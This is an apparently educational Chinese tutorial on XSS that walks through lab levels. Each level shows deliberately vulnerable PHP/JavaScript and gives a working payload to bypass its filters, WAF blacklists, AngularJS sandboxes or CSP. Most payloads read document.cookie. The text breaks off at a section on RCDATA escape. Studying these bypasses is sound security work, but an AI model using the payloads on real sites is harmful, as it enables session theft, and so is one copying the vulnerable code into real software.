# 手撕 XSS 漏洞：XSS 类型、绕过技巧与利用实战全解

## XSS 类型

### 反射型
#### 定义
反射型 XSS，也称为非持久型 XSS，其核心特点是：恶意脚本作为 HTTP 请求的一部分被发送到服务器，服务器在响应中“原样反射”回这些脚本，并在用户的浏览器中执行
#### 漏洞源码
后端直接接收 name 参数并输出到页面中，没有任何过滤或转义
```php
if (isset($_GET['name'])) {
    $name = $_GET['name'];
    // Vulnerability: No sanitization
    echo "Hello, " . $name . "!";
}
```
#### Payload
```html
<script>alert(document.cookie)</script>
```
成功执行，这一关也可以执行 XSS 平台的 #### Payload 拿到 flag

### DOM 型
#### 定义
DOM 型 XSS 是一种特殊类型的XSS攻击，其特点是：
● 恶意代码的执行完全在客户端的浏览器中发生，不涉及服务器响应内容的修改
● 攻击向量（#### Payload）通过修改页面的 DOM 树结构来实现
● 服务器响应的原始 HTML 可能是"干净"的，但客户端的 JavaScript 代码不安全地处理了数据，导致了漏洞
#### 漏洞源码
JS 从 URL 获取 keyword 参数并写入 innerHTML
```javascript
if (keyword) {
  const container = document.getElementById('result');
  container.innerHTML = "Search results for: " + keyword;
  const scripts = container.getElementsByTagName('script');
  for (let i = 0; i < scripts.length; i++) {
    const script = document.createElement('script');
    if (scripts[i].src) {
      script.src = scripts[i].src;
    } else {
      script.text = scripts[i].innerText;
    }
    document.body.appendChild(script);
  }
} else {
  document.getElementById('result').innerText = "No keyword provided. Try adding ?keyword=test to the URL.";
}
```
#### Payload
```html
?keyword=<script>alert(document.cookie)</script>
```

### 存储型
#### 定义
存储型 XSS，也称为持久型 XSS，其核心特点是：
●  恶意脚本被永久存储在服务器上（数据库、文件系统、缓存等） 
● 每当用户访问受感染的页面时，恶意代码都会自动执行
● 无需用户点击特定链接，只需访问正常页面即可触发
#### 漏洞源码
用户的评论被保存到 JSON 文件中，读取时未经过 htmlspecialchars 处理直接输出
```php
file_put_contents($file, json_encode($data));
foreach (array_reverse($comments) as $c):
  echo $c['text'];
endforeach;
```
#### Payload
```html
<script>alert(document.cookie)</script>
```

## XSS 绕过

### 双引号绕过
#### 漏洞源码
输入被输出到了 `<input>` 标签的 value 属性中，且由双引号包裹。但后端未对双引号进行转义
```html
<form method="GET" action="">
    <?php
        $keyword = isset($_GET['keyword']) ? $_GET['keyword'] : 'Try to break me';
    ?>
    <label>Search:</label>
    <input type="text" name="keyword" value="<?php echo $keyword; ?>">
    <button type="submit">Search</button>
    <button type="button" onclick="window.location.href='index.php'" style="background: #ff3333; margin-left: 5px;">Clear Input</button>
</form>
```
#### 绕过思路
闭合前面的双引号，添加事件属性，注释掉后面的内容
#### Payload
```html
" onclick="alert(document.cookie)"
```

### JavaScript 伪协议绕过
#### 漏洞源码
后端使用 str_ireplace 将 `<script` 替换为 `<scr_ipt`，这阻止了直接使用 `<script>` 标签，但未过滤其他的 HTML 标签
```php
<?php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_ireplace("<script", "<scr_ipt", $str);
    echo "Result: " . $str;
}
?>
```
#### 绕过思路
利用不需要 <script> 标签的 #### Payload
#### Payload
```html
<a href="javascript:alert(document.cookie)">Click</a>
```

### 单引号绕过
#### 漏洞源码
后端过滤了双引号 `"`，但 HTML 源码中使用**单引号** `'` 包裹属性值
```html
<form method="GET" action="">
    <?php
        $keyword = isset($_GET['keyword']) ? $_GET['keyword'] : '';
        $keyword_safe = str_replace('"', '&quot;', $keyword);
    ?>
    <label>Search:</label>
    <input type="text" name="keyword" value='<?php echo $keyword_safe; ?>'>
    <button type="submit">Search</button>
    <button type="button" onclick="window.location.href='index.php'" style="background: #ff3333; margin-left: 5px;">Clear Input</button>
</form>
```
#### 绕过思路
利用 HTML 解析的宽容性，使用单引号闭合属性
#### Payload
```html
' onclick='alert(document.cookie)
```

### 双写绕过
#### 漏洞源码
后端将敏感关键词替换为空字符串，且只执行了一次替换（非递归）
```php
if (isset($_GET['keyword'])) {
    $str = strtolower($_GET['keyword']);
    $bad_words = ['script', 'on', 'src', 'data', 'href'];
    foreach ($bad_words as $word) {
        $str = str_replace($word, '', $str);
    }
    $str = $_GET['keyword'];
    $str = str_ireplace($bad_words, '', $str);
    echo "Result: <input value=\"" . $str . "\">";
}
```
#### 绕过思路
双写关键词。例如 script 被替换为空，那么 scrscriptipt 中间的 script 消失后，两边的字符会重新拼合
#### Payload
```html
"><scrscriptipt>alert(document.cookie)</scrscriptipt>
```

### Unicode 编码绕过
#### 漏洞源码
后端替换了大量关键词，并转义了双引号。但是输入点在 href 属性中
```php
if (isset($_GET['keyword'])) {
    $str = strtolower($_GET['keyword']);
    $str = str_replace("script", "scr_ipt", $str);
    $str = str_replace("on", "o_n", $str);
    $str = str_replace("src", "sr_c", $str);
    $str = str_replace("data", "da_ta", $str);
    $str = str_replace("href", "hr_ef", $str);
    $str = str_replace("javascript", "java_script", $str);
    $str = htmlspecialchars($str); 
    $str = $_GET['keyword'];
    $str = str_replace("script", "scr_ipt", $str);
    $str = str_replace("on", "o_n", $str);
    $str = str_replace("src", "sr_c", $str);
    $str = str_replace("data", "da_ta", $str);
    $str = str_replace("href", "hr_ef", $str);
    $str = str_replace("javascript", "\"java_script\"", $str);
    $str = str_replace('"', '&quot;', $str);
    echo '<a href="' . $str . '">Your Link</a>';
}
```
#### 绕过思路
利用 HTML 实体编码。浏览器在解析属性值时会自动解码实体
#### Payload
```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;
```

### 双写+注释绕过
#### 漏洞源码
输入必须包含 `http://`，script 关键词被替换为空
```php
if (isset($_GET['keyword'])) {
$str = $_GET['keyword'];
$str = str_ireplace("script", "", $str); 
if (strpos($str, 'http://') === false) {
    echo '<p style="color:red;">Error: Invalid URL. Must contain http://</p>';
} else {
    echo '<a href="' . $str . '">Your Link</a>';
}
}
```
#### 绕过思路
构造包含 `http://` 的 #### Payload，同时利用双写绕过 script 清洗
利用 JS 注释 `//` 来隐藏 `http://`
#### Payload
```html
javascrscriptipt:alert(document.cookie)//http://
```

### 大小写绕过
#### 漏洞源码
后端使用大小写敏感的 str_replace 过滤了全小写的 javascript
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_replace("javascript", "", $str);
    $str = str_replace("script", "", $str);
    echo '<a href="' . $str . '">Your Link</a>';
}
```
#### 绕过思路
利用浏览器对协议解析的大小写不敏感特性
#### Payload
```html
JavaScript:alert(document.cookie)
```

### JS 闭合绕过
#### 漏洞源码
输入被放置在 JS 变量的单引号字符串中
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str_safe = str_replace(['<', '>'], ['&lt;', '&gt;'], $str);
    echo "var t_str = '$str_safe';";
    echo "\n            document.write('Current Search: ' + t_str);";
} else {
    echo "var t_str = 'Guest';";
}
```
#### 绕过思路
利用 JS 字符串拼接的特性，构造出包含 XSS Payload 的字符串
闭合前面的单引号，使用分号结束语句，执行 Payload，注释掉后面的内容
#### Payload
```html
';alert(document.cookie);//
```

### IMG 标签绕过
#### 漏洞源码
JS 使用正则 `/ <script|javascript:/i` 对输入进行了检测。如果通过，则写入 `innerHTML`
```html
<script>
    function processInput() {
        const urlParams = new URLSearchParams(window.location.search);
        const keyword = urlParams.get('keyword');
        if (keyword) {
            const blacklist = /<script|javascript:/i;
            if (blacklist.test(keyword)) {
                document.getElementById('result').innerText = "馃毇 Malicious content detected!";
                document.getElementById('result').style.color = "red";
            } else {
                document.getElementById('result').innerHTML = "Results: " + keyword;
            }
        }
    }
    processInput();
</script>
```
#### 绕过思路
正则只拦截了 `<script` 和 `javascript:`。但 `innerHTML` 还支持其他大量的 XSS 向量，如 `<img>`, `<iframe>`, `<svg>` 等
#### Payload
```html
<img src=x onerror=alert(document.cookie)>
```

### URL 编码绕过
#### 漏洞源码
后端对输入进行了 `urlencode`，看起来很安全，`%`、`'`、`<` 等都会被编码
但前端使用了危险的 Sink：
```javascript
var decodedUrl = decodeURIComponent(currentUrl);
setTimeout('console.log("' + decodedUrl + '")', 100);
```
`setTimeout` 的第一个参数如果是字符串，会像 `eval` 一样执行代码。且执行前先进行了解码
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    if (preg_match("/['\"<>]/", $str)) {
        $str = str_replace(['\'', '"', '<', '>'], '_', $str);
    }
    $encoded = urlencode($str);
    echo "var rawInput = '$encoded';";
    echo "\n            // Legacy System: Two rounds of decoding";
    echo "\n            var step1 = decodeURIComponent(rawInput);";
    echo "\n            var step2 = decodeURIComponent(step1);";
    echo "\n            setTimeout('console.log(\"Log: ' + step2 + '\")', 100);";
}
```
#### 绕过思路
后端使用 `preg_match` 拦截了 `'`、`"`、`<`、`>`。如果直接输入 `';alert(1);//`，会被拦截并替换为 `_`
WAF 检查通过后，后端使用 `urlencode` 对字符串进行了编码（例如 `'` 变成 `%27`）
前端代码为了兼容旧数据，执行了**两次** `decodeURIComponent`
代码中的 Sink 是 `setTimeout('console.log("Log: ' + step2 + '")', 100);`
这里使用了双引号 `"` 来包裹日志内容，所以我们需要闭合双引号
输入 `%22` (即 `"`)绕过 WAF 检查
```
urlencode('%22')` -> `%2522`
decodeURIComponent('%2522')` -> `%22`
decodeURIComponent('%22')` -> `"`
```
`setTimeout` 中字符串被闭合，代码执行
#### Payload
```javascript
%22);alert(document.cookie);//
```

### AngularJS constructor 绕过
#### 漏洞源码
```php
<?php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $safe_html = htmlspecialchars($str);
    echo "<div id='result'>Hello, $safe_html</div>";
}
?>
```
#### 绕过思路
因为输出点在 `ng-app` 作用域内，AngularJS 会扫描并解析 `{{ ... }}` 语法。虽然 HTML 标签被转义了，但 `{{` 和 `}}` 没有被转义
在 AngularJS 的表达式沙箱中，通常直接访问 `window` 或 `document` 是被禁止的。但是，我们可以访问对象的 `constructor` 属性
`constructor.constructor`：
    第一个 `constructor` 获取当前上下文对象的构造函数
    第二个 `constructor` 获取该构造函数的构造函数，这通常就是 JavaScript 原生的 `Function` 构造函数
    `Function` 构造函数允许我们将字符串当作代码来创建新的函数（类似于 `eval`）
`('alert(document.cookie)')`：这是传给 `Function` 构造函数的参数，即我们要执行的恶意代码
#### Payload
```javascript
{{constructor.constructor('alert(1)')()}}
```

### Data 伪协议 + postMessage XSS
#### 漏洞源码
后端过滤了 `iframe` src 中的 `javascript:`，但允许 `data:`
iframe 加载 `data:` 协议内容后，源变为 `null`，无法直接访问父页面 DOM
```php
if (isset($_GET['keyword'])) {
    $str = $_GET['keyword'];
    $str = str_ireplace("javascript", "", $str);
    echo '<iframe src="' . htmlspecialchars($str) . '" width="100%" height="100"></iframe>';
} else {
    echo '<iframe src="about:blank" width="100%" height="100"></iframe>';
}
```
但父页面有一个监听 `message` 事件的 Handler，且直接将接收到的数据写入 `innerHTML`
```javascript
window.addEventListener('message', function(e) {
    console.log("Received message:", e.data);
    document.getElementById('message-output').innerHTML = "Received: " + e.data;
});
```
#### 绕过思路
构造一个 `data:` 协议的 iframe，在其中运行 JS，通过 `parent.postMessage()` 发送 XSS #### Payload 给父页面
#### Payload
```php
data:text/html,<script>parent.postMessage('<img src=x onerror=alert(1)>', '*')</script>
```

### JSONP 绕过 CSP
#### 漏洞源码
启用了一个严格的 CSP：只允许同源脚本，禁止 inline 脚本
这意味着 `<script>alert(1)</script>` 无法执行
```php
if (isset($_GET['callback'])) {
    header('Content-Type: application/javascript');
    $cb = $_GET['callback'];
    echo $cb . '({"status": "ok", "time": "' . date('Y-m-d H:i:s') . '"});';
    exit;
}
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
```
但是，同源下有一个 JSONP 端点（`?callback=...`），它会返回 JavaScript 代码
```html
<div style="margin-top:20px; font-size:0.8em; color:#666;">
    Debug: API available at <a href="?callback=test">?callback=test</a>
</div>
```
#### 绕过思路
利用 CSP 允许的同源脚本源（'self'），我们可以加载这个 JSONP 端点作为脚本，并控制 callback 参数来执行任意 JS
#### Payload
```javascript
<script src="?callback=alert(1)"></script>
```

### 非全局替换绕过
#### 漏洞源码
后端负责接收评论并存储到 JSON 文件中。**没有任何过滤或转义逻辑**
前端负责获取评论并在页面上显示。开发者使用了一个 `escapeHTML` 函数来转义危险字符
```javascript
function escapeHTML(html) {
    if (!html) return '';
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
const safeText = escapeHTML(comment.text);
item.innerHTML = `... <div class="comment-body">${safeText}</div> ...`;
```
#### 绕过思路
JavaScript 的 `String.prototype.replace(search, replacement)` 方法有一个特性：
    如果 search 参数是一个字符串（而不是带有全局标志 g 的正则表达式），它只会替换第一个匹配项
利用这个特性，我们可以在 Payload 前面，故意放置一组或多组“废弃”的危险字符
#### Payload
```html
<><img src=x onerror=alert(document.cookie)>
```

### body onresize 绕过
#### 漏洞源码
后端定义了庞大的标签和属性黑名单
```php
$blocked_tags = ['script', 'img', 'iframe', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onload', 'onerror', 'onclick', ...]; // 包含绝大多数常见事件
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
```
#### 绕过思路
面对黑名单 WAF，首要任务是**Fuzzing**，找出哪些标签和属性是被允许的。我们可以发现 `<body>` 和 `onresize`
我们需要构造一个 Payload，利用 `<body>` 标签和 `onresize` 事件
#### Payload
```html
<body onresize=alert(document.cookie)>
```

### svg animatetransform onbegin 绕过
#### 漏洞源码
后端定义了庞大的标签和属性黑名单
```php
$blocked_tags = ['svg', 'animateTransform', ...]; // 包含绝大多数常见标签
$blocked_attributes = ['onbegin', 'onend', 'onclick', ...]; // 包含绝大多数常见事件
if (preg_match("/<\s*$tag\b/i", $input_lower)) { die("Tag Not Allowed"); }
```
#### 绕过思路
面对黑名单 WAF，首要任务是**Fuzzing**，找出哪些标签和属性是被允许的。我们可以发现 `<svg>` 和 `animateTransform`
我们需要构造一个 Payload，利用 `<svg>` 标签和 `animateTransform` 事件
`<svg>` 标签可以包含 `<animate>` 或 `<animateTransform>` 等动画标签
这些动画标签支持 `onbegin` 事件（动画开始时触发）
#### Payload
```html
<svg><animatetransform onbegin=alert(document.cookie)>
```

### link accesskey 绕过
#### 漏洞源码
本关卡模拟了一个 SEO 优化场景，页面包含一个指向自身的 `<link rel="canonical">` 标签
由于单引号未被转义，我们可以使用单引号 `'` 闭合 `href` 属性，然后注入其他属性
```php
$host = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$raw_request_uri = $_SERVER['REQUEST_URI'];
$decoded_request_uri = urldecode($raw_request_uri);
$current_url = $protocol . "://" . $host . $decoded_request_uri;
$safe_url = htmlspecialchars($current_url); 
echo "<link rel='canonical' href='$safe_url'>";
```
#### 绕过思路
虽然 `<link>` 标签通常不可见，但我们可以利用 `accesskey` 属性配合 `onclick` 事件
`accesskey="x"`：定义激活元素的快捷键（Windows 下通常是 `Alt + Shift + X`）
`onclick="alert(document.cookie)"`：当元素被激活（点击或快捷键）时触发
#### Payload
```html
/?%27accesskey=%27x%27onclick=%27alert(document.cookie)
```

### JavaScript 表达式绕过
#### 漏洞源码
输入被反射在 JavaScript 对象的属性值中，被单引号包裹
后端使用了 `htmlspecialchars($q, ENT_COMPAT)`。`ENT_COMPAT` (默认模式) 仅编码双引号 `"`，**不编码单引号 `'`**
```javascript
var analyticsData = {
    sessionId: "sess_<?php echo uniqid(); ?>",
    timestamp: <?php echo time(); ?>,
    searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
    category: 'general'
};
```
#### 漏洞利用
利用 JavaScript 表达式 `''-alert(document.cookie)-''` 执行 Payload
其插入到源码中则是 `searchTerm: ''-alert(document.cookie)-'',`。在 JavaScript 解释器看来，这是在执行一个数学减法运算
解析结构 ：
JS 引擎把这行代码解析为三个部分，通过减号 - 连接：
    第一部分： '' (空字符串)
    第二部分： alert(document.cookie) (函数调用)
    第三部分： '' (空字符串)
为了计算这个减法表达式的值，JS 引擎必须先求出每一个操作数的值，也就是浏览器必须立即执行 alert(document.cookie) 函数
#### Payload
```html
'-alert(document.cookie)-'
```

### ${} 表达式绕过
#### 漏洞源码
使用 escape_for_template_literal 将危险字符转为 Unicode 形式，这样不会破坏模板字符串的边界或形成 HTML 注入
```php
function escape_for_template_literal($s) {
    return strtr($s, [
        '<' => '\\u003C',
        '>' => '\\u003E',
        '"' => '\\u0022',
        "'" => '\\u0027',
        '\\' => '\\u005C',
        '`' => '\\u0060',
    ]);
}
$q = isset($_GET['q']) ? $_GET['q'] : '';
$escaped = escape_for_template_literal($q);
```
用户输入直接拼接进模板字符串源码
```html
<input type="text" name="q" placeholder="Enter payload here" value="<?php echo htmlspecialchars($q, ENT_QUOTES); ?>">
```
#### 绕过思路
模板字符串是用反引号 `...` 包裹的字符串，内部的 ${...} 是“表达式插槽”，不是普通文本
当 JavaScript 解析到模板字符串时，会先计算所有 ${...} 表达式的值，再把结果拼接成最终字符串
因此如果用户输入被原样放进模板字符串源码中， ${alert(document.cookie)} 会在解析阶段执行 alert(document.cookie)
#### Payload
```javascript
${alert(document.cookie)}
```

### AngularJS 无字符串逃逸链
#### 漏洞源码
取第一个 & 之后的整段查询串作为表达式，进行 urldecode 后注入
```php
if ($qs !== '') {
    $parts = explode('&', $qs);
    if (count($parts) > 1) {
        $expr = urldecode(implode('&', array_slice($parts, 1)));
    } else {
        $expr = $search !== '' ? $search : '1';
    }
}
```
```html
<div>{{ <?php echo $expr; ?> }}</div>
<div ng-init="<?php echo $expr; ?>"></div>
```
#### 绕过思路
##### 沙箱破坏
1. toString() → 获取字符串对象（如 "1"）
2. constructor.prototype → 获取 String 原型
3. charAt=[].join → 将 String 的 charAt 方法替换为 Array 的 join 方法
AngularJS 沙箱使用 charAt 检查标识符是否合法（防止使用危险的属性如 constructor）。当 charAt 被替换为 join 后
1. 检查 "constructor".charAt(0) 原本应该返回 "c"
2. 现在变成 ["constructor"].join() 返回 "constructor"（整个字符串）
3. 使得沙箱误以为 constructor 是合法标识符
##### 表达式构造
1. [1] → 创建一个数组
2. |orderBy: → AngularJS 过滤器语法，将数组传递给 orderBy 过滤器
3. toString().constructor → 现在可以访问 String 构造函数（由于第一步破坏了检查）
4. fromCharCode(120,61,97,108,101,114,116,40,49,41) → 构建字符串 x=alert(1)
#### Payload
```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)=1
```

### AngularJS CSP 绕过
#### 漏洞源码
CSP 设置在页面头部
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src-elem 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self' https://ajax.googleapis.com; object-src 'none'; base-uri 'self'");
```
页面引入 AngularJS 1.4.4 并在 body 上启用 `ng-app`
```html
<body ng-app>
    <div id="content"><?php echo $render; ?></div>
<body>
```
反射逻辑对 `search` 做一次 URL 解码后直接输出到 DOM（位于 Angular 作用域内）
```php
$render = urldecode($search);
```
自动触发逻辑：同源外部脚本在加载后尝试聚焦 `id=x` 的元素（用于触发 `ng-focus` 表达式）
```javascript
document.addEventListener('DOMContentLoaded', function () {
  setTimeout(function () {
    var el = document.getElementById('x');
    if (el && typeof el.focus === 'function') { try { el.focus(); } catch (e) {} }
  }, 50);
});
```
#### 绕过思路
- 构造一个可聚焦的元素并在其 `ng-focus` 中注入表达式：
  - `$event.composedPath()`: 这是一个标准的 Web API，返回事件触发时的路径（即从目标元素到 Window 对象的节点数组）
  - `|`: 在 AngularJS 中，这表示过滤器。它会将左侧的结果（即节点数组）作为参数传递给右侧的过滤器函数
  - `orderBy`: 这是 AngularJS 内置的一个强大过滤器。它的本意是给数组排序，但为了实现排序，它会对传入的表达式进行复杂的解析和执行
  - `orderBy:'...'`: orderBy 允许传入一个字符串作为排序键。AngularJS 会动态解析这个字符串并执行它
  - `(z=alert)`: 将全局函数 alert 赋值给变量 z
  - `(document.cookie)`: 紧接着调用 z（即调用 alert），并将 document.cookie 作为参数传入
- 由于表达式由 Angular 在模板编译时执行，不属于内联 `<script>`，因此不会被 `script-src` 拦截；聚焦由同源外部脚本触发，符合 CSP
#### Payload
```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

### SVG 动画驱动 href 注入绕过
#### 漏洞源码
读取输入与 WAF 检测
```php
$search = isset($_GET['search']) ? $_GET['search'] : '';
if ($search) {
    $s = strtolower($search);
    if (preg_match('/\bon\w+\s*=/i', $s)) {
        http_response_code(400);
        die('Blocked: event handlers not allowed');
    }
    if (preg_match('/\bhref\s*=/i', $s)) {
        http_response_code(400);
        die('Blocked: href attribute not allowed');
    }
}
```
#### 绕过思路
- WAF 使用的是基于输入字符串的浅层匹配：
    - `on\w+=` 拦截内联事件属性（如 `onclick=`）
    - `href=` 拦截显式的 `href` 赋值
  - 但**不会识别 SVG/SMIL 的“动态属性赋值”语义**，例如 `<animate>` 的 `attributeName` 与 `values` 在渲染期为目标元素设置属性值，从而绕过对输入中“直接出现的 href=”的检测
- 构造 SVG 结构，使用 `<animate>` 在渲染阶段为 `<a>` 动态设置 `href`：
  - `<a>` 起初不包含 `href=`（因此 WAF 不命中）
  - `<animate attributeName=href values=javascript:alert(document.cookie)>` 在解析/动画阶段将 `href` 写入为 `javascript:alert(document.cookie)`
  - 用户点击 `<text>` 触发链接，执行 `javascript:` 代码
#### Payload
```html
<svg><a><animate attributeName=href values=javascript:alert(document.cookie) /><text x=20 y=20>Click me</text></a>
```

### JavaScript 闭合 + 注释绕过
#### 漏洞源码
用户输入被直接拼接到 fetch 的 body 参数
```html
<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&<?php echo $q; ?>'}).finally(_=>window.location='/')">Back to Blog</a>
```
输入参数与字符限制（WAF）：禁止空白字符与圆括号，使用浅层正则匹配判断是否阻断
```php
$q = isset($_GET['q']) ? $_GET['q'] : '';
$blocked = false;
if ($q !== '') {
    if (preg_match('/[\s]/', $q)) $blocked = true;
    if (preg_match('/[()]/', $q)) $blocked = true;
}
```
#### 绕过思路
- 目标是在 JavaScript URL 的上下文中执行任意代码，同时满足以下限制：
  - 不能使用空格（以 `/**/` 注释替代空格）
  - 不能使用圆括号（使用隐式类型转换触发执行）
- 利用链路：
  - `'},`: 闭合前面的字符串 `'` 和对象 `}`。使用逗号 , 告诉 JS 引擎：后面还有其他的表达式需要计算
  - `x=x=>{throw/**/onerror=alert,document.cookie}`: 定义一个恶意函数 x。该函数会将全局错误处理函数 onerror 改为 alert，然后抛出异常
  - `toString=x, window+''`: 将 window.toString 指向恶意函数。当 window + '' 发生时，JS 会自动调用 toString 进行类型转换，从而执行函数
  - `,{x:'`: 开启一个新的对象，并留下一个未闭合的单引号，用来吞掉原代码中剩下的 `'}).finally(...)`，保证整段 JS 语法合法
#### Payload
```
'},x=x=>{throw/**/onerror=alert,document.cookie},toString=x,window+'',{x:'
```

### CSP 拼接绕过
#### 漏洞源码
CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令
`script-src 'self'` 禁止内联脚本，导致 `<script>alert(document.cookie)</script>` 不执行
```php
$search = isset($_GET['search']) ? $_GET['search'] : '';
$token = isset($_GET['token']) ? $_GET['token'] : '';
header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
```
#### 绕过思路
- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
- 将脚本作为 `search` 反射到页面
#### Payload
```html
<script>alert(document.cookie)</script>
;script-src-elem 'unsafe-inline'
```

### Data 伪协议 + Base64 编码绕过
#### 漏洞源码
```php
if (isset($_GET['content'])) {
    $content = $_GET['content'];
    $decoded = null;
    if (preg_match('/<object[^>]*\bdata\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $content, $m)) {
        $decoded = base64_decode($m[1]);
    } elseif (preg_match('/data:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $content, $m)) {
        $decoded = base64_decode($m[1]);
    }
    if ($decoded !== null) {
        echo $decoded;
    } else {
        $blacklist = [ '<script', 'javascript:', '<img', '<iframe', 'onerror', 'onclick', /* ... */ ];
        echo str_ireplace($blacklist, '', $content);
    }
}
```
#### 绕过思路
- 服务端对 data:text/html;base64 的内容进行提取与 Base64 解码，并将解码后的 HTML原样输出到主页面上下文
- 未进行任何 HTML 转义，导致脚本在主文档环境执行，可访问 document.cookie
- 当不匹配 data URL 时，走黑名单清洗分支，因黑名单不完整仍可被其他向量绕过
#### Payload
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSFRNTCBUT0tFTiIpPC9zY3JpcHQ+" type="text/html"></object>
```

### 属性名 + / 混淆绕过
#### 漏洞源码
简单正则拦截
```php
if (isset($_GET['html'])) {
    $html = $_GET['html'];
    $decoded = null;
    if (preg_match('/<iframe[^>]*\bsrc\s*\/?\s*=\s*(?:"|\')?data:text\/html;base64,([^"\'\s>]+)(?:"|\')?[^>]*>/i', $html, $m)) {
        $decoded = base64_decode($m[1]);
    } elseif (preg_match('/\bdata:text\/html;base64,([A-Za-z0-9+\/=]+)/i', $html, $m)) {
        $decoded = base64_decode($m[1]);
    }
    if ($decoded !== null) {
        echo $decoded;
    } else {
        $pattern = '/(src|href)\s*=\s*["\']?data:/i';
        $sanitized = preg_replace($pattern, '$1=blocked:', $html);
        $sanitized = preg_replace('/\b(src|href)\s*\/\s*=/i', '$1=', $sanitized);
        echo $sanitized;
    }
}
```
#### 绕过思路
正则 `/ (src|href)\s*=\s*["']?data:/i` 仅能匹配“常规形式”的属性书写
HTML 规范允许在属性名与等号之间插入斜杠 `/`（以及空白符），浏览器仍能正确解析；此时简单正则无法匹配，从而绕过
#### Payload
```html
<iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></iframe>
```

### 括号表示法 + 字符串拼接绕过
#### 漏洞源码
基础 WAF 替换规则（仅针对点号/关键字）
```php
$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
```
链接反射点
```php
<a id="go" href="<?php echo $safe; ?>">Open Link</a>
```
#### 绕过思路
服务端只替换了 `alert(` 与 `window.alert` 的连续字符串形式
JS 支持方括号访问与字符串拼接，`window['al'+'ert'](document.cookie)` 在运行时动态组合出 `alert`，避开了后端规则的静态匹配
#### Payload
```
javascript:window['al'+'ert'](document.cookie)
```

### 字符串碎裂化绕过（eval/window）
#### 漏洞源码
基础 WAF（仅替换连续特征的 alert 与 window.alert）
```php
$safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
$safe = preg_replace('/window\s*\.\s*alert/i', 'window.blocked', $safe);
```
#### 绕过思路
大部分 WAF 的规则库是基于特征码的。如果规则是扫描 `alert(`，那么当你将其拆分为 `a='aler'` 和 `b='t'` 时，任何一段单独看都是合法的赋值语句，不具备攻击特征
利用 `eval()` 或者 `window[]` 将碎裂的字符串拼接并重新激活为可执行代码
#### Payload
```html
<img src="1" onerror="a='aler';b='t';c='(document.cookie)';eval(a+b+c)">
<img src="1" onerror="a='aler';b='t';window[a+b](document.cookie)">
```

### CSS 动画事件绕过
#### 漏洞源码
强白名单 WAF
```php
if (preg_match('/<style[^>]*>\s*@keyframes\s+x\s*\{\s*\}\s*<\/style>/i', $render, $m1)) {
    $allowed .= $m1[0];
    $rest = str_replace($m1[0], '', $rest);
}
if (preg_match('/<xss[^>]*\bstyle\s*=\s*["\'][^"\']*animation-name\s*:\s*x[^"\']*["\'][^>]*\bonanimationend\s*=\s*(?:"[^"]*"|\'[^\']*\')[^>]*>\s*<\/xss>/i', $render, $m2)) {
    $allowed .= $m2[0];
    $rest = str_replace($m2[0], '', $rest);
}
```
#### 绕过思路
定义动画脉络 (`<style>`)：`@keyframes x{}` 定义了一个名为 x 的空动画。虽然它什么都不做，但它在浏览器的动画引擎中注册了一个合法的动画序列
创建载体元素 (`<xss>`)：使用一个自定义标签 `<xss>`。由于 HTML5 的容错性，浏览器会将未定义的标签渲染为内联元素。这能有效绕过那些只针对标准标签（如 script, img, svg）的黑名单过滤
挂载动画驱动 (`style="animation-name:x"`)： 通过 CSS 属性将前面定义的动画 x 绑定到该元素上
捕获生命周期钩子 (`onanimationend`)： 这是核心。当浏览器解析到这个元素并应用样式时，动画会立即开始执行并结束。动画结束的一瞬间，浏览器会触发 onanimationend 事件
#### Payload
```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(document.cookie)"></xss>
```



### RCDATA 元素逃逸绕过
#### 漏洞源码
执行点提取与其余转义
```php
if (preg_match('/<img[^>]*\bonerror\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)[^>]*>/i', $part2, $m)) {
  $output .= $m[0];
  $rest2 = str_replace($m[0], '', $part2);
  $output .= htmlspecialchars($rest2, ENT_QUOTES);
} else {
  $output .= htmlspecialchars($part2, ENT_QUOTES);
}
```
#### 绕过思路
